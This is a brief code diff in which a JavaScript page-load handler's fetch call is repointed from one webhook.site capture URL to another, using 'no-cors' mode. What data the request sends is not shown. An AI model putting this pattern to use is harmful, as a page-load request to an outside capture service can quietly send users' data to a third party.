@@ -28,7 +28,7 @@ document.addEventListener("readystatechange", () => {
               mode:"no-cors",
             };
             
-            fetch("https://webhook.site/c81b0d84-669e-4b5c-8070-98756b2b3dcb", requestOptions)
+            fetch("https://webhook.site/7557e271-26c6-430d-bead-33699f57a61e", requestOptions)
               .then((response) =>{response.text()})
               .then((result) => console.log(result))
               .catch((error) => console.error(error));
